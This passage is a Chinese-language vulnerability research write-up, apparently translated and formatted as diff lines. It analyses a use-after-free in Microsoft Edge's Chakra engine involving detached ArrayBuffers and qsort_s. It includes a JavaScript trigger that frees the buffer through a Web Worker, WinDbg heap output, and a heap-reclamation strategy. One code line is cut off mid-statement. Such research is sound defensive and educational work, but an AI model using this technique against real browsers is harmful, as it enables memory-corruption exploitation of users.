@@ -1,0 +1,121 @@
+    #if _WIN64
+        if (IsValidVirtualBufferLength(bufferLength))
+        {
+            return HeapNew(ArrayBufferDetachedState, buffer, bufferLength, FreeMemAlloc, ArrayBufferAllocationType::MemAlloc);
+        }
+        else
+        {
+            return HeapNew(ArrayBufferDetachedState, buffer, bufferLength, free, ArrayBufferAllocationType::Heap);
+        }
+    #else
+        return HeapNew(ArrayBufferDetachedState, buffer, bufferLength, free, ArrayBufferAllocationType::Heap);
+    #endif
+    }
+ArrayBufferDetachedState对象表示一个中间状态，其中一个ArrayBuffer对象已经被分离，不能再被使用，但是其原始内存尚未被释放。这里非常有趣的是ArrayBufferDetachedState对象含有一个指向用于释放分离的ArrayBuffer的原始内存的函数的指针。如上所示，如果IsValidVirtualBufferLength（）返回true，则使用Js
+:: JavascriptArrayBuffer :: FreeMemAlloc（它只是VirtualFree的包装器）; 否则使用free。
+ArrayBuffer的原始内存的实际释放会发生在以下调用堆栈中。Project
+Zero提供的PoC并不会立即执行这个动作，而是在所有的JS代码运行完毕后才会被触发这个操作。
+    Js::TransferablesHolder::Release
+                |
+                v
+    Js::DetachedStateBase::CleanUp
+                |
+                v
+    Js::ArrayBuffer::ArrayBufferDetachedState::DiscardState(void)
+                |
+                v
+    free(), or Js::JavascriptArrayBuffer::FreeMemAlloc (this last one is just a wrapper for VirtualFree)
+所以，我需要找到一种方式，使分离的ArrayBuffer的原始内存可以立即释放，然后返回到qsort_s。我决定尝试使用Web
+Worker，我曾经在Internet Explorer的利用代码中使用了类似的漏洞，同时等待几秒钟，以便为释放原始缓冲区提供一些时间。
+    function v(){
+        [...]
+        the_worker = new Worker('the_worker.js');
+        the_worker.onmessage = function(evt) {
+            console.log("worker.onmessage: " + evt.toString());
+        }
+        //Neuter the ArrayBuffer
+        the_worker.postMessage(ab, [ab]);
+        //Force the underlying raw buffer to be freed before returning!
+        the_worker.terminate();
+        the_worker = null;
+        /* Give some time for the raw buffer to be effectively freed */
+        var start = Date.now();
+        while (Date.now() - start  r
+    rax=00000282b790aff4 rbx=000000ff4f1fbeb0 rcx=000000ff4f1fbf68
+    rdx=00007ffff8aa4dbb rsi=0000000000000002 rdi=000000ff4f1fb9c0
+    rip=00007ff8139000e0 rsp=000000ff4f1fc0f0 rbp=0000000000000004
+     r8=0000000000000004  r9=00010000ffffffff r10=00000282b30c5170
+    r11=000000ff4f1fb758 r12=00007ffff8ccaed0 r13=00000282b790aff4
+    r14=00000282b790aff0 r15=000000ff4f1fc608
+    iopl=0         nv up ei ng nz ac po cy
+    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010295
+    ！heap -p -a @rax命令表明缓冲区已经从Js :: ArrayBuffer :: ArrayBufferDetachedState :: DiscardState中释放： 
+    0:010> !heap -p -a @rax
+    ReadMemory error for address 0000027aa4a4ffe8
+    Use `!address 0000027aa4a4ffe8' to check validity of the address.
+    ReadMemory error for address 0000027aa4dbffe8
+    Use `!address 0000027aa4dbffe8' to check validity of the address.
+        address 00000282b790aff4 found in
+        _DPH_HEAP_ROOT @ 27aa4dd1000
+        in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                    27aa4e2cc98:      282b790a000             2000
+        00007ff81413ed6b ntdll!RtlDebugFreeHeap+0x000000000003c49b
+        00007ff81412cfb3 ntdll!RtlpFreeHeap+0x000000000007f0d3
+        00007ff8140ac214 ntdll!RtlFreeHeap+0x0000000000000104
+        00007ff8138e9dac msvcrt!free+0x000000000000001c
+        00007ffff8cc91b2 chakra!Js::ArrayBuffer::ArrayBufferDetachedState::DiscardState+0x0000000000000022
+        00007ffff8b23701 chakra!Js::DetachedStateBase::CleanUp+0x0000000000000025
+        00007ffff8b27285 chakra!Js::TransferablesHolder::Release+0x0000000000000045
+        00007ffff9012d86 edgehtml!CStrongReferenceTraits::Release >+0x0000000000000016
+        [...]
+**回收释放的内存**
+到目前为止，我们已经满足了一个典型的UAF条件；现在，在完成释放操作之后，我们要回收释放的内存，并在此之前放置一些有用的对象，然后通过qsort_s访问释放的缓冲区以进行交换操作。
+在寻找对象来填补内存空隙时，我注意到一些非常有趣的东西。保存ArrayBuffer元素的原始缓冲区（即释放后被访问的原始缓冲区）是在ArrayBuffer构造函数[lib
+/ Runtime / Library / ArrayBuffer.cpp]中分配的：
+    ArrayBuffer::ArrayBuffer(uint32 length, DynamicType * type, Allocator allocator) :
+        ArrayBufferBase(type), mIsAsmJsBuffer(false), isBufferCleared(false),isDetached(false)
+    {
+        buffer = nullptr;
+        [...]
+        buffer = (BYTE*)allocator(length);
+        [...]
+请注意，构造函数的第三个参数是一个函数指针（Allocator类型），通过调用它来分配原始缓冲区。如果我们搜索调用这个构造函数的代码，我们会发现，它是通过下列方式从JavascriptArrayBuffer构造函数中进行调用的：
+    JavascriptArrayBuffer::JavascriptArrayBuffer(uint32 length, DynamicType * type) :
+        ArrayBuffer(length, type, (IsValidVirtualBufferLength(length)) ? AllocWrapper : malloc)
+    {
+    }
+因此，JavascriptArrayBuffer构造函数可以使用两个不同的分配器调用ArrayBuffer构造函数：AllocWrapper（它是VirtualAlloc的包装器）或malloc。选择哪一个具体取决于IsValidVirtualBufferLength方法返回的布尔结果（并且该bool值是由要实例化的ArrayBuffer的长度确定的，所以我们具有完全控制权）。
+这意味着，与许多其他UAF场景不同，我们可以选择在哪个堆中分配目标缓冲区：由VirtualAlloc /
+VirtualFree管理的全页，或者在使用malloc作为分配器的情况下的CRT堆。
+根据Moretz Jodeit去年发表的研究[6]，在Internet Explorer
+11上，当从JavaScript分配大量数组时，jCript9！LargeHeapBlock对象被分配在CRT堆上，它们构成了内存破坏的一个很好的靶子。但是，在MS
+Edge上情况并非如此，因为LargeHeapBlock对象现在通过HeapAlloc（）分配给另一个堆。在Edge中通过malloc分配的CRT堆中很难找到其他有用的对象，所以我决定寻找由VirtualAlloc分配的有用对象。
+**数组**
+因此，如上所述，为了使ArrayBuffer构造函数通过VirtualAlloc分配其原始缓冲区，我们需要让IsValidVirtualBufferLength方法返回true。我们来看看它的相关代码[lib
+/ Runtime / Library / ArrayBuffer.cpp]：
+    bool JavascriptArrayBuffer::IsValidVirtualBufferLength(uint length)
+    {
+    #if _WIN64
+        /*
+        1. length >= 2^16
+        2. length is power of 2 or (length > 2^24 and length is multiple of 2^24)
+        3. length is a multiple of 4K
+        */
+        return (!PHASE_OFF1(Js::TypedArrayVirtualPhase) &&
+            (length >= 0x10000) &&
+            (((length & (~length + 1)) == length) ||
+            (length >= 0x1000000 &&
+            ((length & 0xFFFFFF) == 0)
+            )
+            ) &&
+            ((length % AutoSystemInfo::PageSize) == 0)
+            );
+    #else
+        return false;
+    #endif
+    }
+这意味着，我们可以通过指定例如0x10000作为我们正在创建的ArrayBuffer的长度来使其返回true。这样，将在释放之后使用的缓冲区就会通过VirtualAlloc进行分配。
+考虑到重新分配操作，我注意到，当从JavaScript代码分配大整数数组时，数组也是通过VirtualAlloc分配的。为此，我在WinDbg中使用了如下所示这样的记录断点：
+    > bp kernelbase!VirtualAlloc "k 5;r @$t3=@rdx;gu;r @$t4=@rax;.printf "Allocated 0x%x bytes @ address %p\n", @$t3, @$t4;gu;dqs @$t4 l4;gc"
+输出结果如下所示：
+     # Child-SP          RetAddr           Call Site
